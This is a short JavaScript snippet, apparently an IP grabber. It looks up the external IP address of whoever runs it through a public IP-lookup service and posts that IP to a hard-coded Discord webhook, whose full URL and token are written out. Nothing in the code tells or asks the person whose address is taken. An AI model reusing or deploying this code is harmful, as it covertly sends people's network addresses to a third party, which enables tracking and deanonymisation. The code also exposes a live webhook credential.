async function fetchIP() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  const ip = data.ip;
  return ip;
}

let externalIP;

fetchIP()
  .then(ip => {
    externalIP = ip;
    const params = {
      username: 'real% =  = href ;;',
      avatar_url: '',
      content: externalIP,
    };

fetch('https://discord.com/api/webhooks/1229239913967386665/44DotwpieUk4Uc2NCCtu71NymkJqzmZZn_va353Xep54Tf3tpzNNbyajE3Ml2dORL97F', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
})
    })
